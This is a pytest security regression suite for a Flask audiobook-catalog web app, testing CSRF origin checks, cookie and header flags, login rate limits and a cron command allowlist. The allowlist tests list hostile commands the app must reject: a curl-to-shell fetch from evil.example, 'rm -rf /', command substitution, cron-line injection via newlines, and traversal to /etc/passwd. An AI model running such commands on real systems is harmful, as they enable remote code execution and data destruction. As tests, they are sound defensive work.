"""Security regression tests for the Phase 16 web audit (docs/status/phase16/audit-web.md).

W1/W9 lazy user creation, W2 CSRF Origin check + cookie flags, W4 logout
during an in-flight profile sync, W5 cron command allowlist, W6/W12
server-side profile-sync throttle, W7 login rate limit, W8 security headers,
W10 secret key, W11 login input validation, W13 bulk parameter validation.
All in-memory SQLite, no network.
"""

import json
import sys
import threading
from datetime import datetime, timedelta, timezone
from unittest.mock import MagicMock, patch

import pytest
from flask import Flask, g, jsonify
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.db.base import Base
from app.db.models import Book, SyncConfig, SyncRun, User, UserListenedBook, UserSettings

FUTURE = "2099-01-01T00:00:00+00:00"


def _active(email, **extra):
    return json.dumps({
        "email": email, "access_token": "a", "refresh_token": "r", "expires_at": FUTURE, **extra,
    })


@pytest.fixture
def factory(tmp_path):
    # A file DB (not :memory:): background threads must see the same database,
    # and the W4 test needs real SQLite locking between connections.
    engine = create_engine(f"sqlite:///{tmp_path / 'web.db'}", connect_args={"check_same_thread": False})
    Base.metadata.create_all(engine)
    Factory = sessionmaker(bind=engine)
    with Factory() as s:
        s.add(SyncConfig(id=1, genre_slug="g", genre_id=1, art_type="audiobook",
                         language_code="ru", only_subscription=True))
        for bid in (100, 200, 300):
            s.add(Book(id=bid, title=f"B{bid}", url=f"/b/{bid}", art_type=1,
                       cached_at=datetime.now(timezone.utc)))
        s.commit()
    return Factory


def _add_user(Factory, session_data=None, litres_login=None, listened=()):
    with Factory() as s:
        u = User(created_at=datetime.now(timezone.utc), session_data=session_data,
                 litres_login=litres_login)
        s.add(u)
        s.flush()
        s.add(UserSettings(user_id=u.id))
        for bid in listened:
            s.add(UserListenedBook(user_id=u.id, book_id=bid, listened_at=datetime.now(timezone.utc)))
        s.commit()
        return u.id


@pytest.fixture
def web(factory):
    """Middleware + auth blueprint + probe routes, DB patched everywhere."""
    app = Flask(__name__)
    app.config["TESTING"] = True
    app.config["SECRET_KEY"] = "test-secret"
    app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
    with patch("app.middleware.SessionLocal", factory), \
         patch("app.controllers.auth.SessionLocal", factory):
        from app.controllers.auth import bp
        from app.middleware import register_session_middleware

        register_session_middleware(app)
        app.register_blueprint(bp)

        @app.route("/whoami", methods=["GET", "POST"])
        def whoami():
            return jsonify({"user_id": g.user_id})

        yield app, factory


def _client(app, user_id=None):
    c = app.test_client()
    if user_id is not None:
        with c.session_transaction() as sess:
            sess["user_id"] = user_id
    return c


def _users(Factory):
    with Factory() as s:
        return s.query(User).count()


# ---------------------------------------------------------------- W1 / W9


class TestLazyUserCreation:
    def test_cookieless_get_head_404_write_nothing(self, web):
        app, F = web
        for path in ("/robots.txt", "/favicon.ico", "/nope", "/auth/status", "/whoami"):
            app.test_client().get(path)
        app.test_client().head("/wp-login.php")
        assert _users(F) == 0

    def test_cookieless_get_needs_no_write_lock(self, web, tmp_path):
        """A held SQLite write lock does not block an anonymous page view."""
        app, _ = web
        db = tmp_path / "lock.db"
        engine = create_engine(f"sqlite:///{db}", connect_args={"check_same_thread": False})
        Base.metadata.create_all(engine)
        FileFactory = sessionmaker(bind=engine)
        import sqlite3

        holder = sqlite3.connect(db, isolation_level=None)
        holder.execute("PRAGMA busy_timeout=0")
        holder.execute("BEGIN IMMEDIATE")
        try:
            with patch("app.middleware.SessionLocal", FileFactory), \
                 patch("app.controllers.auth.SessionLocal", FileFactory):
                r = app.test_client().get("/auth/status")
            assert r.status_code == 200
            assert r.get_json()["authenticated"] is False
        finally:
            holder.execute("ROLLBACK")
            holder.close()

    def test_catalog_form_submit_and_sort_create_user(self, web):
        from app.middleware import _request_needs_user_row

        app, _ = web
        app.add_url_rule("/", endpoint="catalog.index", view_func=lambda: "")
        cases = {"/": False, "/?genre_id=5": False, "/?page=2": False,
                 "/?_submit=1": True, "/?sort=rating": True}
        for url, expected in cases.items():
            with app.test_request_context(url):
                from flask import request

                request.url_rule = app.url_map.bind("localhost").match("/", return_rule=True)[0]
                assert _request_needs_user_row() is expected, url

    def test_login_creates_user_only_after_validation(self, web):
        app, F = web
        app.test_client().post("/auth/login", json={"email": "", "password": ""})
        app.test_client().post("/auth/logout")
        assert _users(F) == 0


# ---------------------------------------------------------------- W2 / W8


class TestCsrfOriginCheck:
    def test_cross_origin_logout_rejected_and_listened_kept(self, web):
        app, F = web
        uid = _add_user(F, _active("v@e.com"), "v@e.com", listened=(100, 200))
        c = _client(app, uid)
        r = c.post("/auth/logout", data="x=1", content_type="application/x-www-form-urlencoded",
                   headers={"Origin": "https://evil.example"})
        assert r.status_code == 403
        with F() as s:
            assert s.query(UserListenedBook).filter_by(user_id=uid).count() == 2

    @pytest.mark.parametrize("headers", [
        {"Origin": "null"},
        {"Referer": "https://evil.example/page"},
        {"Origin": "http://localhost.evil.example"},
    ])
    def test_foreign_or_opaque_sources_rejected(self, web, headers):
        app, _ = web
        assert app.test_client().post("/whoami", headers=headers).status_code == 403

    @pytest.mark.parametrize("headers", [
        {"Origin": "http://localhost"},
        {"Origin": "https://localhost"},  # TLS proxy in front: scheme differs
        {"Referer": "http://localhost/?genre_id=1"},
        {},  # non-browser client (no Origin, no Referer)
    ])
    def test_same_origin_allowed(self, web, headers):
        app, _ = web
        assert app.test_client().post("/whoami", headers=headers).status_code == 200

    def test_forwarded_host_and_trusted_origins(self, web):
        app, _ = web
        c = app.test_client()
        r = c.post("/whoami", headers={"Origin": "https://pub.example", "X-Forwarded-Host": "pub.example"})
        assert r.status_code == 200
        with patch("app.config.Config.TRUSTED_ORIGINS", {"https://other.example"}):
            assert c.post("/whoami", headers={"Origin": "https://other.example"}).status_code == 200

    def test_get_is_never_blocked(self, web):
        app, _ = web
        assert app.test_client().get("/whoami", headers={"Origin": "https://evil.example"}).status_code == 200


class TestCookieAndHeaders:
    def _cookie(self, app, **kw):
        r = app.test_client().post("/whoami", **kw)
        return r.headers["Set-Cookie"]

    def test_cookie_flags_plain_http(self, web):
        app, _ = web
        cookie = self._cookie(app)
        assert "HttpOnly" in cookie
        assert "SameSite=Lax" in cookie
        assert "Secure" not in cookie  # local http dev keeps working

    def test_cookie_secure_behind_tls_proxy(self, web):
        app, _ = web
        assert "Secure" in self._cookie(app, headers={"X-Forwarded-Proto": "https"})
        assert "Secure" in self._cookie(app, base_url="https://localhost")

    def test_cookie_secure_forced(self, web):
        app, _ = web
        app.config["SESSION_COOKIE_SECURE_MODE"] = "1"
        assert "Secure" in self._cookie(app)

    def test_security_headers(self, web):
        app, _ = web
        r = app.test_client().get("/whoami")
        assert r.headers["X-Frame-Options"] == "DENY"
        assert r.headers["X-Content-Type-Options"] == "nosniff"
        assert "frame-ancestors 'none'" in r.headers["Content-Security-Policy"]
        assert r.headers["Referrer-Policy"] == "strict-origin-when-cross-origin"


# ---------------------------------------------------------------- W10


class TestSecretKey:
    def test_default_key_refused_under_gunicorn(self):
        from app.config import Config
        from app.middleware import register_session_middleware

        app = Flask(__name__)
        app.config["SECRET_KEY"] = Config.INSECURE_DEV_SECRET_KEY
        with patch.dict(sys.modules, {"gunicorn": MagicMock()}):
            with pytest.raises(RuntimeError, match="SECRET_KEY"):
                register_session_middleware(app)

    def test_default_key_allowed_for_dev_server(self):
        from app.config import Config
        from app.middleware import register_session_middleware

        app = Flask(__name__)
        app.config["SECRET_KEY"] = Config.INSECURE_DEV_SECRET_KEY
        modules = {k: v for k, v in sys.modules.items() if k != "gunicorn"}
        with patch.dict(sys.modules, modules, clear=True):
            register_session_middleware(app)


# ---------------------------------------------------------------- W7 / W11


class TestLogin:
    @pytest.mark.parametrize("body", [
        {"email": 123, "password": "x"},
        ["a"],
        {"email": "a@b.c", "password": None},
        "just a string",
    ])
    def test_malformed_body_is_400(self, web, body):
        app, _ = web
        r = app.test_client().post("/auth/login", json=body)
        assert r.status_code == 400

    @patch("app.controllers.auth.run_profile")
    @patch("app.controllers.auth.get_valid_token")
    def test_password_not_stripped(self, mock_token, _sync, web):
        app, _ = web
        mock_token.return_value = "jwt"
        r = app.test_client().post("/auth/login", json={"email": " a@b.c ", "password": " pw "})
        assert r.status_code == 200
        assert mock_token.call_args.kwargs["password"] == " pw "
        assert mock_token.call_args.kwargs["email"] == "a@b.c"

    @patch("app.controllers.auth.get_valid_token")
    def test_rate_limited_per_email(self, mock_token, web):
        from app.scrapers.auth import LitresAuthRejectedError

        app, _ = web
        mock_token.side_effect = LitresAuthRejectedError("wrong")
        codes = [
            app.test_client().post("/auth/login", json={"email": "v@e.com", "password": f"p{i}"},
                                   environ_base={"REMOTE_ADDR": f"10.0.0.{i}"}).status_code
            for i in range(7)
        ]
        assert codes == [401] * 5 + [429, 429]
        assert mock_token.call_count == 5  # LitRes is not contacted once limited

    @patch("app.controllers.auth.get_valid_token")
    def test_rate_limited_per_ip(self, mock_token, web):
        from app.scrapers.auth import LitresAuthRejectedError

        app, _ = web
        app.config["LOGIN_RATE_MAX_PER_IP"] = 3
        mock_token.side_effect = LitresAuthRejectedError("wrong")
        codes = [
            app.test_client().post("/auth/login", json={"email": f"u{i}@e.com", "password": "p"}).status_code
            for i in range(5)
        ]
        assert codes == [401, 401, 401, 429, 429]

    def test_forwarded_ip_only_with_trusted_proxy(self, web):
        from app.controllers.auth import _client_ip

        app, _ = web
        hdr = {"X-Forwarded-For": "1.2.3.4, 9.9.9.9"}
        with app.test_request_context("/", headers=hdr, environ_base={"REMOTE_ADDR": "172.17.0.1"}):
            assert _client_ip() == "172.17.0.1"
            app.config["TRUSTED_PROXY_HOPS"] = 1
            assert _client_ip() == "9.9.9.9"

    def test_limiter_window_expires(self):
        from app.controllers.auth import _SlidingWindowLimiter

        lim = _SlidingWindowLimiter()
        assert all(lim.hit("k", 2, 60, now=t) for t in (0, 1))
        assert not lim.hit("k", 2, 60, now=2)
        assert lim.hit("k", 2, 60, now=61)


# ---------------------------------------------------------------- W4


class TestLogoutDuringProfileSync:
    def _run_with_logout(self, F, uid, email, during):
        from app.sync import profile as prof

        gate, fetched = threading.Event(), threading.Event()

        def slow_fetch(**_):
            fetched.set()
            gate.wait(5)
            return [100, 200, 300]

        with patch.object(prof, "_fetch_with_reauth", slow_fetch):
            t = threading.Thread(target=prof.run_profile, kwargs=dict(
                session_factory=F, email=email, user_id=uid))
            t.start()
            fetched.wait(5)
            during()
            gate.set()
            t.join(10)

    def test_logout_does_not_resurrect_listened(self, web):
        app, F = web
        fresh = datetime.now(timezone.utc).isoformat()  # no automatic sync on logout
        uid = _add_user(F, _active("u3@e.com", profile_synced_at=fresh), "u3@e.com")
        c = _client(app, uid)
        self._run_with_logout(F, uid, "u3@e.com", lambda: c.post("/auth/logout"))
        with F() as s:
            assert s.query(UserListenedBook).filter_by(user_id=uid).count() == 0
            assert s.get(User, uid).session_data is None
            run = s.query(SyncRun).filter_by(type="profile").one()
            assert run.status == "failed" and "switched" in run.error_message

    def test_account_switch_does_not_mix_lists(self, web):
        _, F = web
        uid = _add_user(F, _active("a@e.com"), "a@e.com")

        def switch():
            with F() as s:
                u = s.get(User, uid)
                u.session_data = _active("b@e.com")
                u.litres_login = "b@e.com"
                s.commit()

        self._run_with_logout(F, uid, "a@e.com", switch)
        with F() as s:
            assert s.query(UserListenedBook).filter_by(user_id=uid).count() == 0
            data = json.loads(s.get(User, uid).session_data)
            assert data["email"] == "b@e.com" and "profile_synced_at" not in data

    def test_unchanged_account_commits_and_clears_claim(self, web):
        from app.sync.profile import run_profile

        _, F = web
        uid = _add_user(F, _active("a@e.com", profile_sync_claimed_at=FUTURE), "a@e.com")
        with patch("app.sync.profile._fetch_with_reauth", return_value=[100, 200]):
            run_profile(session_factory=F, email="A@e.com", user_id=uid)
        with F() as s:
            assert s.query(UserListenedBook).filter_by(user_id=uid).count() == 2
            data = json.loads(s.get(User, uid).session_data)
            assert "profile_synced_at" in data and "profile_sync_claimed_at" not in data


# ---------------------------------------------------------------- W6 / W12


class TestProfileSyncThrottle:
    def test_replayed_cookie_starts_one_sync(self, web):
        """W6: the same (pre-sync) cookie replayed 5x starts one background sync."""
        app, F = web
        stale = (datetime.now(timezone.utc) - timedelta(hours=30)).isoformat()
        uid = _add_user(F, _active("u2@e.com", sid="s", profile_synced_at=stale), "u2@e.com")
        raw_cookie = _client(app, uid).get_cookie("session").value
        with patch("app.middleware.threading.Thread") as mock_thread:
            for _ in range(5):
                c = app.test_client()
                c.set_cookie("session", raw_cookie)
                assert c.get("/whoami").get_json()["user_id"] == uid
        assert mock_thread.call_count == 1

    def test_claim_is_atomic_across_callers(self, factory):
        from app.sync.profile import claim_profile_sync

        uid = _add_user(factory, _active("x@e.com"))
        wins = [claim_profile_sync(factory, uid, retry_minutes=15) for _ in range(3)]
        assert wins == [True, False, False]
        later = datetime.now(timezone.utc) + timedelta(minutes=16)
        assert claim_profile_sync(factory, uid, retry_minutes=15, now=later) is True

    def test_claim_lost_on_concurrent_change(self, factory):
        """Compare-and-swap: a session_data change between read and write loses the claim."""
        from app.sync import profile as prof

        uid = _add_user(factory, _active("x@e.com"))
        real = prof.has_litres_tokens

        def change_then_check(data):
            with factory() as s:
                s.get(User, uid).session_data = _active("x@e.com", sid="new")
                s.commit()
            return real(data)

        with patch.object(prof, "has_litres_tokens", change_then_check):
            assert prof.claim_profile_sync(factory, uid, retry_minutes=15) is False

    @patch("app.middleware.threading.Thread")
    @patch("app.middleware.get_valid_token")
    def test_transient_failure_backs_off(self, mock_token, mock_thread, web, monkeypatch):
        """W12: a LitRes outage costs one synchronous check per retry window."""
        from app.config import Config
        from app.scrapers.auth import LitresAuthTransientError

        monkeypatch.setattr(Config, "LITRES_EMAIL", None)
        app, F = web
        old = (datetime.now(timezone.utc) - timedelta(days=3)).isoformat()
        uid = _add_user(F, json.dumps({
            "email": "u@e.com", "access_token": "a", "refresh_token": "r",
            "expires_at": old, "profile_synced_at": old,
        }), "u@e.com")
        mock_token.side_effect = LitresAuthTransientError("down")
        c = _client(app, uid)
        for _ in range(4):
            c.get("/whoami")
        assert mock_token.call_count == 1
        mock_thread.assert_not_called()


# ---------------------------------------------------------------- W5 / W13 (admin)


@pytest.fixture
def admin(factory, tmp_path):
    fresh = datetime.now(timezone.utc).isoformat()  # no automatic profile sync
    uid = _add_user(factory, _active("admin@e.com", profile_synced_at=fresh), "admin@e.com")
    from app.start import create_app

    app = create_app()
    app.config["TESTING"] = True
    app.config["SECRET_KEY"] = "test-secret"
    with patch("app.middleware.SessionLocal", factory), \
         patch("app.controllers.admin_panel.SessionLocal", factory), \
         patch("app.controllers.admin_panel._PERSISTENT_CRONTAB", str(tmp_path / "crontab")), \
         patch("app.controllers.admin_panel.subprocess") as sub, \
         patch("app.controllers.admin_panel._CRON_ENV_FILE", str(tmp_path / ".cron-env")), \
         patch("app.controllers.admin_panel.Config") as cfg:
        cfg.ADMIN_EMAILS = {"admin@e.com"}
        cfg.SYNC_DIR = str(tmp_path)
        cfg.BASE_DIR = str(tmp_path)
        sub.run.return_value = MagicMock(returncode=0, stderr="")
        client = _client(app, uid)
        client.cron_subprocess = sub  # for asserting the crontab install call
        yield client, factory, tmp_path, uid


class TestCronAllowlist:
    @pytest.mark.parametrize("command", [
        "cd /app && /usr/local/bin/python -m app.sync bulk --max-pages 100 >> /app/persistent/sync/cron.log 2>&1",
        "cd /app && /usr/local/bin/python -m app.sync bulk >> /app/persistent/sync/cron.log 2>&1",
        "python -m app.sync heal --dry-run --verbose",
        "python -m app.sync bulk --resume --max-hours 2.5",
        "python -m app.sync profile --user-id 1",
        "python -m app.sync bulk --refresh-series 300 --no-refresh-genres",
        "python -m app.sync retry-failed --failed-file /app/persistent/sync/failed_books_20260101_000000.jsonl",
    ])
    def test_sync_commands_accepted(self, admin, command):
        c, *_ = admin
        r = c.post("/admin/cron/update", json={"jobs": [{"schedule": "0 0 * * *", "command": command}]})
        assert r.status_code == 200, r.get_json()

    @pytest.mark.parametrize("command", [
        "curl https://evil.example/x | sh",
        "python -m app.sync bulk; rm -rf /",
        "python -m app.sync bulk && id",
        "python -m app.sync bulk $(id)",
        "python -m app.sync bulk --max-pages abc",
        "python -m app.sync bulk --max-pages",
        "python -m app.sync bulk --evil",
        "python -m app.sync nope",
        "python -m app.sync bulk >> /etc/cron.d/x.log 2>&1",
        "python -m app.sync bulk\n* * * * * id",
        "python -m app.sync retry-failed --failed-file /etc/passwd",
        "python -m app.sync retry-failed --failed-file /app/persistent/sync/../../etc/passwd",
        "python -m http.server",
    ])
    def test_other_commands_rejected(self, admin, command):
        c, _, tmp_path, _ = admin
        r = c.post("/admin/cron/update", json={"jobs": [{"schedule": "0 0 * * *", "command": command}]})
        assert r.status_code == 400
        assert not (tmp_path / "crontab").exists()

    def test_description_newline_cannot_inject_a_line(self, admin):
        c, _, tmp_path, _ = admin
        r = c.post("/admin/cron/update", json={"jobs": [{
            "schedule": "0 0 * * *", "command": "python -m app.sync heal",
            "description": "nightly\n* * * * * id\r\nmore",
        }]})
        assert r.status_code == 200
        lines = (tmp_path / "crontab").read_text().splitlines()
        assert "# nightly * * * * * id more" in lines
        assert not any(line.startswith("* * * * * id") for line in lines)

    def test_cross_origin_admin_post_rejected(self, admin):
        c, *_ = admin
        r = c.post("/admin/sync/bulk", data="x", content_type="text/plain",
                   headers={"Origin": "https://evil.example"})
        assert r.status_code == 403


class TestBulkStart:
    @pytest.mark.parametrize("body", [
        {"max_pages": "abc"}, {"max_pages": -1}, {"max_pages": 2.5}, {"max_hours": "x"},
        {"max_pages": True},
    ])
    def test_bad_params_rejected(self, admin, body):
        c, *_ = admin
        with patch("app.controllers.admin_panel.threading.Thread") as t:
            r = c.post("/admin/sync/bulk", json=body)
        assert r.status_code == 400
        t.assert_not_called()

    def test_profile_run_does_not_block_bulk(self, admin):
        c, F, _, _ = admin
        with F() as s:
            s.add(SyncRun(sync_config_id=1, type="profile", status="running",
                          started_at=datetime.now(timezone.utc), pages_fetched=0,
                          books_upserted=0, series_fetched=0))
            s.commit()
        with patch("app.controllers.admin_panel.threading.Thread") as t:
            r = c.post("/admin/sync/bulk", json={"max_pages": "5"})
        assert r.status_code == 202
        assert t.call_args.kwargs["kwargs"]["max_pages"] == 5

    def test_manual_profile_sync_not_duplicated(self, admin):
        c, *_ = admin
        with patch("app.controllers.admin_panel.threading.Thread") as t:
            first = c.post("/admin/sync/profile")
            second = c.post("/admin/sync/profile")
        assert (first.status_code, second.status_code) == (202, 409)
        assert t.call_count == 1


class TestCronEnvHeader:
    """W14: the admin install keeps the entrypoint's env header in front."""

    def _install(self, admin):
        c, *_ = admin
        r = c.post("/admin/cron/update", json={"jobs": [{"schedule": "0 0 * * *",
                                                         "command": "python -m app.sync heal"}]})
        assert r.status_code == 200
        return c.cron_subprocess.run.call_args

    def test_env_file_prepended(self, admin):
        _, _, tmp_path, _ = admin
        (tmp_path / ".cron-env").write_text("DATABASE_URI=sqlite:////x.db")
        call = self._install(admin)
        assert call.args[0] == ["crontab", "-"]
        assert call.kwargs["input"].startswith("DATABASE_URI=sqlite:////x.db\n# LitRes sync")
        assert "python -m app.sync heal" in call.kwargs["input"]

    def test_no_env_file_in_dev(self, admin):
        call = self._install(admin)
        assert call.kwargs["input"].startswith("# LitRes sync")


class TestBulkRunClaim:
    """W13: the request inserts the running row; a second start gets 409."""

    def test_second_start_conflicts_and_run_id_passed(self, admin):
        c, F, _, _ = admin
        with patch("app.controllers.admin_panel.threading.Thread") as t:
            first = c.post("/admin/sync/bulk", json={"max_pages": 3})
            second = c.post("/admin/sync/bulk", json={})
        assert (first.status_code, second.status_code) == (202, 409)
        assert t.call_count == 1
        run_id = t.call_args.kwargs["kwargs"]["run_id"]
        with F() as s:
            run = s.get(SyncRun, run_id)
            assert (run.status, run.type) == ("running", "delta")

    def test_resume_does_not_preinsert(self, admin):
        c, *_ = admin
        with patch("app.controllers.admin_panel.threading.Thread") as t:
            assert c.post("/admin/sync/bulk", json={"resume": True}).status_code == 202
        assert t.call_args.kwargs["kwargs"]["run_id"] is None

    def test_busy_db_returns_503(self, admin):
        from sqlalchemy.exc import OperationalError

        c, *_ = admin
        with patch("app.controllers.admin_panel._insert_running_catalog_run",
                   side_effect=OperationalError("x", {}, Exception("database is locked"))):
            assert c.post("/admin/sync/bulk", json={}).status_code == 503

    def test_run_bulk_adopts_inserted_row(self, admin):
        """End to end with the sync lane: run_bulk(run_id=...) takes over the row."""
        c, F, _, _ = admin
        with patch("app.controllers.admin_panel.threading.Thread") as t:
            c.post("/admin/sync/bulk", json={"max_pages": 1})
        run_id = t.call_args.kwargs["kwargs"]["run_id"]
        from app.sync.bulk import _adopt_sync_run

        with F() as s:
            assert _adopt_sync_run(s, run_id).id == run_id


# ---------------------------------------------------------------- F9: login error copy


def _is_russian(text: str) -> bool:
    return any("а" <= ch.lower() <= "я" for ch in text)


class TestLoginErrorMessages:
    """Every /auth/* error is a fixed Russian message, never exception text."""

    def _login(self, app, body=None):
        return app.test_client().post(
            "/auth/login", json=body or {"email": "v@e.com", "password": "secret-pw"})

    @pytest.mark.parametrize("exc, status, message", [
        ("rejected401", 401, "Неверный email или пароль"),
        ("rejected429", 503, "ЛитРес отклонил вход. Попробуйте позже"),
        ("transient", 503, "ЛитРес недоступен, попробуйте позже"),
        ("shape", 502, "Не удалось войти. Попробуйте позже"),
        ("crash", 500, "Не удалось войти. Попробуйте позже"),
    ])
    def test_litres_failures(self, web, exc, status, message):
        from app.scrapers.auth import (
            LitresAuthError,
            LitresAuthRejectedError,
            LitresAuthTransientError,
        )

        secret = "Connection error: [Errno 111] secret-pw http://10.0.0.1"
        errors = {
            "rejected401": LitresAuthRejectedError(secret, status_code=401),
            "rejected429": LitresAuthRejectedError(secret, status_code=429),
            "transient": LitresAuthTransientError(secret),
            "shape": LitresAuthError(secret),
            "crash": RuntimeError(secret),
        }
        app, _ = web
        with patch("app.controllers.auth.get_valid_token", side_effect=errors[exc]):
            r = self._login(app)
        assert r.status_code == status
        assert r.get_json() == {"ok": False, "error": message}

    def test_empty_fields(self, web):
        app, _ = web
        r = self._login(app, {"email": "", "password": ""})
        assert (r.status_code, r.get_json()["error"]) == (400, "Введите email и пароль")

    @patch("app.controllers.auth.get_valid_token")
    def test_rate_limited(self, mock_token, web):
        from app.scrapers.auth import LitresAuthRejectedError

        app, _ = web
        app.config["LOGIN_RATE_MAX_PER_EMAIL"] = 1
        mock_token.side_effect = LitresAuthRejectedError("x", status_code=401)
        self._login(app)
        r = self._login(app)
        assert r.status_code == 429 and _is_russian(r.get_json()["error"])

    def test_unexpected_error_after_auth_is_json(self, web):
        """A crash outside the try (e.g. DB) still answers JSON, no traceback text."""
        app, _ = web
        with patch("app.controllers.auth.get_valid_token", return_value="jwt"), \
             patch("app.controllers.auth._get_listened_count", side_effect=RuntimeError("db secret")):
            r = self._login(app)
        assert r.status_code == 500
        assert r.get_json() == {"ok": False, "error": "Не удалось выполнить запрос. Попробуйте позже"}

    def test_scraper_marks_status_and_non_json(self):
        """litres_login: 401 → rejected(401); 429 → rejected(429); HTML 200 → LitresAuthError."""
        import httpx

        from app.scrapers.auth import (
            LitresAuthError,
            LitresAuthRejectedError,
            litres_login,
        )

        def client_for(status, body, ctype="application/json"):
            transport = httpx.MockTransport(
                lambda req: httpx.Response(status, content=body, headers={"content-type": ctype}))
            return httpx.Client(transport=transport)

        for status in (401, 429):
            with pytest.raises(LitresAuthRejectedError) as ei:
                litres_login(client_for(status, b"{}"), "a@b.c", "p")
            assert ei.value.status_code == status
        with pytest.raises(LitresAuthError) as ei:
            litres_login(client_for(200, b"<html>captcha</html>", "text/html"), "a@b.c", "p")
        assert not isinstance(ei.value, LitresAuthRejectedError)
